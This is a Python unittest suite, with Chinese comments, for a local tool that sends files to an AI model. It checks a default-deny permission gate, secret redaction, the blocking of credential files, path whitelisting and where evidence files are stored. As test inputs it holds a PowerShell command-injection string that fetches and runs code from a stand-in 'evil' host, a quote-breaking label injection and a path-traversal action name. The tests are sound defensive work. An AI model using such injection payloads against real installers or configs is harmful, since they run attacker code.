"""通道自检。零第三方依赖，标准库 unittest 即可跑：

    python -m unittest discover -s tests -v

这些用例对应审计报告里的判据，把它们钉死，防止改代码时悄悄退化。
模型层一律 mock，不联网、不消耗额度。
"""
from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import cli  # noqa: E402
import detector  # noqa: E402
import evidence  # noqa: E402
import install_sendto  # noqa: E402
import model  # noqa: E402
import router  # noqa: E402


class ChannelTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        os.environ["ARMORY_EVIDENCE_DIR"] = str(Path(cls._tmp.name) / "ev")
        cls.tmp = Path(cls._tmp.name)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()
        os.environ.pop("ARMORY_EVIDENCE_DIR", None)

    # ---- 入口健壮性 ----

    def test_empty_paths_is_error_not_crash(self):
        out = router.route("info", [])
        self.assertEqual(out["status"], "error")
        self.assertEqual(out["http"], 400)

    def test_unknown_action_is_400(self):
        self.assertEqual(router.route("nope", [str(ROOT / "cli.py")])["http"], 400)

    def test_unknown_action_writes_no_evidence(self):
        before = len(list(Path(os.environ["ARMORY_EVIDENCE_DIR"]).glob("*.json")))
        router.route("../../evil", [str(ROOT / "cli.py")])
        after = len(list(Path(os.environ["ARMORY_EVIDENCE_DIR"]).glob("*.json")))
        self.assertEqual(before, after, "未知动作不该落证据文件")

    # ---- Permission Gate：默认拒绝，不是黑名单 ----

    def test_high_risk_action_denied(self):
        out = router.route("rename", [str(ROOT / "cli.py")])
        self.assertEqual(out["status"], "denied")
        self.assertEqual(out["http"], 403)

    def test_new_high_risk_action_is_denied_without_being_listed(self):
        """新增一个没写进 prototype_deny 的高危动作，也必须被拦住。"""
        spec = {
            "actions": {
                "nuke": {"label": "删除一切", "kind": "local", "types": ["*"], "risk": "high"},
                "safe": {"label": "安全", "kind": "local", "types": ["*"], "risk": "none"},
            },
            "risk_policy": {"require_confirm": [], "prototype_deny": []},
        }
        self.assertIsNotNone(router._permission_gate("nuke", spec))
        self.assertIsNone(router._permission_gate("safe", spec))

    def test_gate_precedes_extraction(self):
        """被拒绝的动作不该留下对象正文快照。"""
        out = router.route("rename", [str(ROOT / "cli.py")])
        self.assertEqual(out["objects"], [])

    def test_action_table_gate_consistency(self):
        leaks = router.assert_gate_consistency()
        self.assertEqual(leaks, [], f"这些高风险动作没有被拦住：{leaks}")

    # ---- 隐私：证据与预览 ----

    def test_evidence_dir_is_outside_repo(self):
        d = evidence.default_dir()
        self.assertNotIn(str(ROOT), str(d), "证据默认目录必须落在仓库之外")

    def test_preview_off_by_default(self):
        os.environ.pop("ARMORY_CAPTURE_PREVIEW", None)
        ctx = detector.extract(str(ROOT / "README.md"))
        self.assertNotIn("preview", ctx)

    def test_sensitive_file_never_gets_preview(self):
        os.environ["ARMORY_CAPTURE_PREVIEW"] = "1"
        try:
            ctx = detector.extract(str(ROOT / "model_config.json"))
            self.assertNotIn("preview", ctx,
                             "配置文件即便开了预览也不许抽正文")
        finally:
            os.environ.pop("ARMORY_CAPTURE_PREVIEW", None)

    def test_secret_shaped_text_is_redacted(self):
        os.environ["ARMORY_CAPTURE_PREVIEW"] = "1"
        try:
            p = self.tmp / "sample.txt"
            p.write_text("api_key = nvapi-SECRETVALUE123456\nnormal line\n", encoding="utf-8")
            ctx = detector.extract(str(p))
            preview = ctx.get("preview", "")
            self.assertNotIn("nvapi-SECRETVALUE123456", preview)
            self.assertIn("[REDACTED]", preview)
        finally:
            os.environ.pop("ARMORY_CAPTURE_PREVIEW", None)

    # ---- 诚实性 ----

    def test_clipboard_failure_returns_false(self):
        with mock.patch.object(cli.subprocess, "run",
                               return_value=mock.Mock(returncode=1, stderr="boom")):
            self.assertFalse(cli.set_clipboard("hello"))

    def test_clipboard_success_returns_true(self):
        with mock.patch.object(cli.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stderr="")):
            self.assertTrue(cli.set_clipboard("hello"))

    def test_binary_is_not_sent_to_model(self):
        p = self.tmp / "fake.pdf"
        p.write_bytes(b"\x00\x01\x02" + b"x" * 500)
        ctx = detector.extract(str(p))
        self.assertEqual(ctx["type"], "document", "伪装成 pdf 确实会被判成文档")
        with mock.patch("model.chat", side_effect=AssertionError("不该调到模型")):
            out = router.route("summarize", [str(p)])
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("不是纯文本", out["result"].get("message", ""))

    # ---- HTTP 总线：默认不可用 ----

    def test_untrusted_route_denied_without_whitelist(self):
        os.environ.pop("ARMORY_ALLOWED_ROOTS", None)
        out = router.route("info", [str(ROOT / "cli.py")], trusted=False)
        self.assertEqual(out["status"], "denied")
        self.assertEqual(out["http"], 403)

    def test_untrusted_route_respects_whitelist(self):
        os.environ["ARMORY_ALLOWED_ROOTS"] = str(ROOT)
        try:
            out = router.route("info", [str(ROOT / "cli.py")], trusted=False)
            self.assertNotEqual(out["status"], "denied")
        finally:
            os.environ.pop("ARMORY_ALLOWED_ROOTS", None)

    def test_untrusted_route_rejects_outside_path(self):
        os.environ["ARMORY_ALLOWED_ROOTS"] = str(ROOT)
        try:
            outside = self.tmp / "outside.txt"
            outside.write_text("secret", encoding="utf-8")
            out = router.route("info", [str(outside)], trusted=False)
            self.assertEqual(out["status"], "denied")
        finally:
            os.environ.pop("ARMORY_ALLOWED_ROOTS", None)

    def test_serve_refuses_without_whitelist(self):
        os.environ.pop("ARMORY_ALLOWED_ROOTS", None)
        with self.assertRaises(SystemExit):
            router.serve(port=0)

    # ---- 外发路径的凭据防护（第 2 轮审计新增 P0） ----

    def test_sensitive_config_is_never_sent_to_model(self):
        """右键「总结」自己的 model_config.json：必须拒绝，不能发出去。"""
        with mock.patch.object(model, "_post",
                               side_effect=AssertionError("凭据文件不该被发出")):
            out = router.route("summarize", [str(ROOT / "model_config.json")])
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("拒绝发送", out["result"].get("message", ""))

    def test_keyfile_is_never_sent_to_model(self):
        """key.txt 只有 1.3KB，体积闸门拦不住，只能靠文件名判据。"""
        p = self.tmp / "key.txt"
        p.write_text("nvapi-FAKE1\nnvapi-FAKE2\n", encoding="utf-8")
        with mock.patch.object(model, "_post",
                               side_effect=AssertionError("key 文件不该被发出")):
            out = router.route("translate", [str(p)])
        self.assertNotEqual(out["result"].get("status"), "ok")
        self.assertIn("拒绝发送", out["result"].get("message", ""))

    def test_secrets_in_body_are_redacted_before_send(self):
        """非敏感文件名，内容里夹着凭据也要抹掉再发。"""
        import json
        p = self.tmp / "notes.txt"
        p.write_text("api_key = nvapi-REALKEY1234567\nordinary line\n", encoding="utf-8")

        captured = {}

        def fake_post(cfg, payload):
            captured.update(payload)
            return {"choices": [{"message": {"content": "done"}}]}

        with mock.patch.object(model, "_post", fake_post):
            out = router.route("summarize", [str(p)])

        body = json.dumps(captured, ensure_ascii=False)
        self.assertNotIn("nvapi-REALKEY1234567", body, "明文凭据进了请求体")
        self.assertIn("[REDACTED]", body)
        self.assertEqual(out["result"]["data"].get("redacted"), 1)

    # ---- Permission Gate：默认拒绝要覆盖「没写 risk 键」的情况 ----

    def test_action_without_risk_field_is_denied(self):
        spec = {"actions": {
            "whatever": {"label": "随便", "kind": "local", "types": ["*"]}},
            "risk_policy": {}}
        self.assertIsNotNone(router._permission_gate("whatever", spec),
                             "没声明 risk 的动作必须被拦，否则'默认拒绝'名不副实")

    def test_action_without_kind_field_is_denied(self):
        spec = {"actions": {
            "whatever": {"label": "随便", "types": ["*"], "risk": "none"}},
            "risk_policy": {}}
        self.assertIsNotNone(router._permission_gate("whatever", spec))

    # ---- 安装脚本：配置数据的注入面 ----

    def test_install_rejects_unsafe_action_key(self):
        with self.assertRaises(SystemExit):
            install_sendto._check_action('x$(Invoke-Expression(iwr http://evil))')
        self.assertEqual(install_sendto._check_action("summarize"), "summarize")

    def test_install_rejects_unsafe_label(self):
        with self.assertRaises(SystemExit):
            install_sendto._check_label("'; Invoke-Expression(1); #")

    # ---- 证据落点 ----

    def test_evidence_never_falls_back_into_repo(self):
        env = {k: v for k, v in os.environ.items()
               if k not in ("LOCALAPPDATA", "ARMORY_EVIDENCE_DIR")}
        with mock.patch.dict(os.environ, env, clear=True):
            d = evidence.default_dir()
        self.assertNotIn(str(ROOT), str(d),
                         "LOCALAPPDATA 缺失时也不许回落到仓库目录")

    def test_gitignore_covers_evidence(self):
        text = (ROOT / ".gitignore").read_text(encoding="utf-8")
        self.assertIn("evidence/", text)
        self.assertNotIn("evidencetmp/", text, "死规则该删掉了")

    def test_token_file_is_generated_once(self):
        with mock.patch.object(router, "TOKEN_FILE", self.tmp / "token"):
            t1 = router.ensure_token()
            t2 = router.ensure_token()
            self.assertEqual(t1, t2)
            self.assertGreaterEqual(len(t1), 32)


if __name__ == "__main__":
    unittest.main(verbosity=2)
